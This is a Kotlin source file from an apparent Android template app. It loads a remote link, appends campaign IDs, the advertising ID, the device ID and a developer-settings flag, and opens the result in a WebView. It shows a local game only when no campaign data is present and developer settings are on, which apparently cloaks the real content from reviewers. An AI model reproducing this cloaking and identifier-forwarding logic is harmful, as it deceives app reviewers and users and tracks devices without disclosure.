package com.example.template

import android.annotation.SuppressLint
import android.app.Activity
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.webkit.WebResourceRequest
import android.webkit.WebView
import com.example.template.adbSets.TemplateWebPage
import com.onesignal.OneSignal
import com.orhanobut.hawk.Hawk
import eu.amirs.JSON

@SuppressLint("StaticFieldLeak")
private lateinit var context: Context
@SuppressLint("StaticFieldLeak")
private lateinit var activity:Activity

fun forFuncBig(
    campaign: List<Array<ArrayList<List<String>>>>,
    loads: JSON,
    ads: List<Array<ArrayList<List<String>>>>,
    devSets: Int,
    context: Context,
    finish:Unit
) {
    if (campaign[0][0][0][0].isNotEmpty()) {
        val url =
            "${loads.jsonObject[LINK]}?sub_id_1=${campaign[0][0][0][0]}&ad_id=${ads[0][0][0][0]}&deviceID=${ads[0][0][0][1]}"
        Hawk.put(RESULT, url)
        startActivity(
            Intent(
                context,
                TemplateWebPage::class.java
            )
        )
        return finish
    } else {
        if (devSets == 0) {
            val url =
                "${loads.jsonObject[LINK]}?ad_id=${ads[0][0][0][0]}&deviceID=${ads[0][0][0][1]}"
            Hawk.put(RESULT, url)
            startActivity(
                Intent(
                    context,
                    TemplateWebPage::class.java
                )
            )
            return finish
        } else {
            Hawk.put(RESULT, GAME)
            startActivity(
                Intent(
                    context,
                    MainActivity::class.java
                )
            )
           return finish

        }
    }
}


fun forFuncFour(
    loads: JSON,
    data: List<Array<java.util.ArrayList<List<String>>>>,
    ads: List<Array<java.util.ArrayList<List<String>>>>,
    devSets: Int,
    context: Context,
    finish: Unit
) {
    val url =
        "${loads.jsonObject[LINK]}?sub_id_1=${data[0][0][0][0]}&ad_id=${ads[0][0][0][0]}&deviceID=${ads[0][0][0][1]}&settings=$devSets"
    Hawk.put(RESULT, url)
    startActivity(
        Intent(
            context,
            TemplateWebPage::class.java
        )
    )
    return finish
}

fun forFuncThree(
    campaign: List<Array<java.util.ArrayList<List<String>>>>,
    loads: JSON,
    data: List<Array<java.util.ArrayList<List<String>>>>,
    ads: List<Array<java.util.ArrayList<List<String>>>>,
    devSets: Int,
    context: Context,
    finish:Unit
) {
    val url =
        "${loads.jsonObject[LINK]}?sub_id_1=${data[0][0][0][0]}&ad_id=${ads[0][0][0][0]}&deviceID=${ads[0][0][0][1]}&settings=$devSets&m_source=${campaign[0][0][0][1]}"
    Hawk.put(RESULT, url)
    startActivity(
        Intent(
            context,
            TemplateWebPage::class.java
        )
    )
   return finish
}


fun forFuncTwo(
    loads: JSON,
    data: List<Array<java.util.ArrayList<List<String>>>>,
    ads: List<Array<java.util.ArrayList<List<String>>>>,
    context: Context,
    finish: Unit
) {
    val url =
        "${loads.jsonObject[LINK]}?sub_id_1=${data[0][0][0][0]}&ad_id=${ads[0][0][0][0]}&deviceID=${ads[0][0][0][1]}"
    Hawk.put(RESULT, url)
    startActivity(
        Intent(
            context,
            TemplateWebPage::class.java
        )
    )
    return finish
}

fun forFuncOne(campaign: List<Array<java.util.ArrayList<List<String>>>>) {
    if (campaign[0][0][0][0].isNotEmpty()) {
        val table =
            if (campaign[0][0][0][0].contains("&push=")) campaign[0][0][0][0].substringAfter(
                "&push="
            ).substringBefore("&") else ""
        if (table.isNotEmpty()) {
            OneSignal.sendTag("sub_app", table)
        }
    }
}

fun request(request: WebResourceRequest?){
    request?.url?.let { its ->
        if (its.host != null) {
            if (LOCAL_HOST == its.host!! &&
                (its.path == null || its.path!!.length < 2)
            ) {
                activity.startActivity(
                    Intent(activity, MainActivity::class.java)
                )
                activity.finish()
            }
        }
    }
}

fun func(view: WebView?, url: String?):Boolean {
    return if (url == null ||
        url.startsWith(HTTP) ||
        url.startsWith(HTTPS)
    )
        false
    else
        try {
            if (url.startsWith(MAILTO)) {
                activity.startActivity(
                    Intent.createChooser(
                        Intent(Intent.ACTION_SEND).apply {
                            type = PLAIN_TEXT
                            putExtra(
                                Intent.EXTRA_EMAIL,
                                url.replace(MAILTO__, "")
                            )
                        },
                        MAIL
                    )
                )
            } else
                if (url.startsWith(TELL)) {
                    activity.startActivity(
                        Intent.createChooser(
                            Intent(Intent.ACTION_DIAL).apply {
                                data = Uri.parse(url)
                            },
                            CALL
                        )
                    )
                }
            val intent = Intent(Intent.ACTION_VIEW, Uri.parse(url))
            view!!.context.startActivity(intent)
            true
        } catch (e: Exception) {
            true
        }
}
fun startActivity(intent: Intent) {
    context.startActivity(intent, null)
}
